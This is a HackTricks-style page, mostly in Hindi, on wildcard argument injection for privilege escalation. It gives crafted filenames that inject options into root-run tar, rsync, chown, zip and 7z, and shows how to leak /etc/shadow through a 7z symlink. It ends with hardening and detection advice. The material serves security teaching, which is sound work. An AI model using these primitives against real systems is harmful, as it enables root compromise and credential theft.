# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (जिसे *glob* भी कहा जाता है) **argument injection** तब होती है जब एक विशेषाधिकार प्राप्त स्क्रिप्ट एक Unix बाइनरी जैसे `tar`, `chown`, `rsync`, `zip`, `7z`, … को एक बिना उद्धृत वाइल्डकार्ड जैसे `*` के साथ चलाती है।  
> चूंकि शेल वाइल्डकार्ड को बाइनरी को निष्पादित करने से **पहले** विस्तारित करता है, एक हमलावर जो कार्यशील निर्देशिका में फ़ाइलें बना सकता है, वह फ़ाइल नाम तैयार कर सकता है जो `-` से शुरू होते हैं ताकि उन्हें **डेटा के बजाय विकल्पों के रूप में** व्याख्यायित किया जा सके, प्रभावी रूप से मनमाने ध्वजों या यहां तक कि आदेशों को तस्करी करने में सक्षम हो।  
> यह पृष्ठ 2023-2025 के लिए सबसे उपयोगी प्राइमिटिव, हाल के शोध और आधुनिक पहचान को एकत्र करता है।

## chown / chmod

आप `--reference` ध्वज का दुरुपयोग करके **किसी भी फ़ाइल के मालिक/समूह या अनुमति बिट्स की कॉपी कर सकते हैं**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
जब रूट बाद में कुछ इस तरह निष्पादित करता है:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` इंजेक्ट किया गया है, जिससे *सभी* मिलान करने वाले फ़ाइलें `/root/secret``file` के स्वामित्व/अनुमतियों को विरासत में लेती हैं।

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (संयुक्त हमला)।
विवरण के लिए क्लासिक DefenseCode पेपर भी देखें।

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** फ़ीचर का दुरुपयोग करके मनमाने कमांड निष्पादित करें:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
एक बार जब रूट चलाता है जैसे `tar -czf /root/backup.tgz *`, `shell.sh` रूट के रूप में निष्पादित होता है।

### bsdtar / macOS 14+

हाल के macOS पर डिफ़ॉल्ट `tar` (जो `libarchive` पर आधारित है) `--checkpoint` को लागू नहीं करता है, लेकिन आप **--use-compress-program** ध्वज के साथ कोड-निष्पादन प्राप्त कर सकते हैं जो आपको एक बाहरी संकुचनकर्ता निर्दिष्ट करने की अनुमति देता है।
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
जब एक विशेषाधिकार प्राप्त स्क्रिप्ट `tar -cf backup.tar *` चलाती है, तो `/bin/sh` शुरू होगा।

---

## rsync

`rsync` आपको कमांड-लाइन फ्लैग के माध्यम से रिमोट शेल या यहां तक कि रिमोट बाइनरी को ओवरराइड करने की अनुमति देता है जो `-e` या `--rsync-path` से शुरू होते हैं:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
यदि रूट बाद में `rsync -az * backup:/srv/` के साथ निर्देशिका को संग्रहित करता है, तो इंजेक्ट किया गया ध्वज आपके शेल को दूरस्थ पक्ष पर उत्पन्न करता है।

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` मोड)।

---

## 7-Zip / 7z / 7za

यहां तक कि जब विशेषाधिकार प्राप्त स्क्रिप्ट *रक्षात्मक रूप से* वाइल्डकार्ड को `--` के साथ पूर्ववर्ती करती है (विकल्प पार्सिंग को रोकने के लिए), 7-Zip प्रारूप **फाइल सूची फ़ाइलों** का समर्थन करता है, फ़ाइल नाम को `@` के साथ पूर्ववर्ती करके। इसे एक सिम्लिंक के साथ मिलाकर आपको *मनमाने फ़ाइलों को एक्सफिल्ट्रेट* करने की अनुमति मिलती है:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
यदि रूट कुछ इस तरह निष्पादित करता है:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip `root.txt` (→ `/etc/shadow`) को फ़ाइल सूची के रूप में पढ़ने का प्रयास करेगा और बाहर निकल जाएगा, **stderr पर सामग्री प्रिंट करते हुए**।

---

## zip

`zip` ध्वज `--unzip-command` का समर्थन करता है जो *शब्दशः* सिस्टम शेल को पास किया जाता है जब संग्रह का परीक्षण किया जाएगा:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## अतिरिक्त बाइनरी जो वाइल्डकार्ड इंजेक्शन के प्रति संवेदनशील हैं (2023-2025 त्वरित सूची)

निम्नलिखित कमांडों का आधुनिक CTFs और वास्तविक वातावरण में दुरुपयोग किया गया है।  पेलोड हमेशा एक *फाइलनाम* के रूप में बनाया जाता है जो एक लिखने योग्य निर्देशिका के अंदर होता है जिसे बाद में वाइल्डकार्ड के साथ संसाधित किया जाएगा:

| बाइनरी | दुरुपयोग करने के लिए ध्वज | प्रभाव |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → मनमाना `@file` | फ़ाइल सामग्री पढ़ें |
| `flock` | `-c <cmd>` | कमांड निष्पादित करें |
| `git`   | `-c core.sshCommand=<cmd>` | SSH के माध्यम से git के माध्यम से कमांड निष्पादन |
| `scp`   | `-S <cmd>` | ssh के बजाय मनमाना प्रोग्राम उत्पन्न करें |

ये प्राइमिटिव *tar/rsync/zip* क्लासिक्स की तुलना में कम सामान्य हैं लेकिन शिकार करते समय जांचने लायक हैं।

---

## पहचान और हार्डनिंग

1. **महत्वपूर्ण स्क्रिप्ट में शेल ग्लोबिंग को निष्क्रिय करें**: `set -f` (`set -o noglob`) वाइल्डकार्ड विस्तार को रोकता है।
2. **आर्गुमेंट्स को उद्धृत या एस्केप करें**: `tar -czf "$dst" -- *` *सुरक्षित* नहीं है — `find . -type f -print0 | xargs -0 tar -czf "$dst"` को प्राथमिकता दें।
3. **स्पष्ट पथ**: `*` के बजाय `/var/www/html/*.log` का उपयोग करें ताकि हमलावर `-` से शुरू होने वाली सहोदर फ़ाइलें नहीं बना सकें।
4. **कम से कम विशेषाधिकार**: जब भी संभव हो, बैकअप/रखरखाव कार्यों को रूट के बजाय एक अप्रिविलेज्ड सेवा खाते के रूप में चलाएं।
5. **निगरानी**: Elastic का पूर्व-निर्मित नियम *Potential Shell via Wildcard Injection* `tar --checkpoint=*`, `rsync -e*`, या `zip --unzip-command` के तुरंत बाद एक शेल चाइल्ड प्रोसेस की तलाश करता है। EQL क्वेरी को अन्य EDRs के लिए अनुकूलित किया जा सकता है।

---

## संदर्भ

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (अंतिम अपडेट 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (18 दिसंबर 2024)

{{#include ../../banners/hacktricks-training.md}}
